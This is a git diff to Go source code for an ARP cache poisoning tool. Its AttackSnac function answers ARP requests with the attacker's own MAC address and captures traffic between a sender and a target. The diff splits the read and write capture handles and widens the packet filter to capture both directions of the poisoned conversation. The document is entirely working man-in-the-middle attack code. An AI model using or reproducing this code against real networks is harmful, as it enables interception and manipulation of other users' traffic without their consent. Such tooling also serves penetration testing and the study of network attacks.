@@ -146,6 +146,7 @@ func WatchArp(ctx context.Context, cfg Cfg) (err error) {
 	// PERPETUALLY CAPTURE PACKETS
 	//============================
 
+	// handle for reading
 	rHandle, err := pcap.OpenLive(cfg.iface.Name, 65536, true, pcap.BlockForever)
 	if err != nil {
 		cfg.log.Error("error opening packet capture", zap.Error(err))
@@ -153,6 +154,7 @@ func WatchArp(ctx context.Context, cfg Cfg) (err error) {
 	}
 	defer rHandle.Close()
 
+	// handle for writing
 	var wHandle *pcap.Handle
 	wHandle, err = pcap.OpenLive(cfg.iface.Name, 65536, true, pcap.BlockForever)
 	if err != nil {
@@ -290,6 +292,10 @@ func GetArpLayer(packet gopacket.Packet) *layers.ARP {
 	return nil
 }
 
+func attackSnacBpf(sIp, tIp string) string {
+	return fmt.Sprintf("src host %s || dst host %s", sIp, tIp)
+}
+
 // AttackSnac poisons the sender's ARP table by sending our MAC address
 // when a request for the target's IP is observed. After poisoning
 // occurs and non-ARP traffic is detected, each packet is passed to
@@ -300,20 +306,30 @@ func GetArpLayer(packet gopacket.Packet) *layers.ARP {
 func AttackSnac(ctx context.Context, cfg Cfg, senIp net.IP, tarIp net.IP,
   handlers ...ArpSpoofHandler) (err error) {
 
-	var handle *pcap.Handle
-	handle, err = pcap.OpenLive(cfg.iface.Name, 65536, true, pcap.BlockForever)
-	if err != nil {
-		cfg.log.Error("failed to start packet capture while attacking snac", zap.Error(err))
+	logFields := []zap.Field{zap.String("senderIp", senIp.String()), zap.String("targetIp", tarIp.String())}
+	var rHandle, wHandle *pcap.Handle
+	if rHandle, err = pcap.OpenLive(cfg.iface.Name, 65536, true, pcap.BlockForever); err != nil {
+		logFields = append(logFields, zap.Error(err))
+		cfg.log.Error("failed to start packet capture to attack snac", logFields...)
 		return
 	}
-	defer handle.Close()
+	defer rHandle.Close()
 
-	if err = handle.SetBPFFilter(fmt.Sprintf("src host %s && dst host %s", senIp.String(), tarIp.String())); err != nil {
-		cfg.log.Error("failed to set bpf filter while attacking snac", zap.Error(err))
+	// filter to capture both sides of the conversation
+	if err = rHandle.SetBPFFilter(attackSnacBpf(senIp.String(), tarIp.String())); err != nil {
+		logFields = append(logFields, zap.Error(err))
+		cfg.log.Error("failed to set bpf filter to attack snac", logFields...)
 		return
 	}
 
-	src := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
+	if wHandle, err = pcap.OpenLive(cfg.iface.Name, 65536, true, pcap.BlockForever); err != nil {
+		logFields = append(logFields, zap.Error(err))
+		cfg.log.Error("failed to start packet capture while attacking snac", logFields...)
+		return
+	}
+	defer wHandle.Close()
+
+	src := gopacket.NewPacketSource(rHandle, layers.LayerTypeEthernet)
 	in := src.Packets()
 
 	for {
@@ -323,12 +339,10 @@ func AttackSnac(ctx context.Context, cfg Cfg, senIp net.IP, tarIp net.IP,
 		case packet := <-in:
 
 			if arp := GetArpLayer(packet); arp != nil && arp.Operation == layers.ARPRequest {
-				fields := []zap.Field{zap.String("senderIp", senIp.String()), zap.String("targetIp", tarIp.String())}
-				cfg.log.Info("received arp request for poisoned conversation", fields...)
-				cfg.log.Info("poisoning sender arp table", fields...)
+				cfg.log.Debug("poisoning sender arp table", logFields...)
 				// Respond with our MAC
 				cfg.arpSenderC <- SendArpCfg{
-					Handle:    handle,
+					Handle:    wHandle,
 					Operation: layers.ARPReply,
 					SenderHw:  cfg.iface.HardwareAddr,
 					SenderIp:  tarIp,
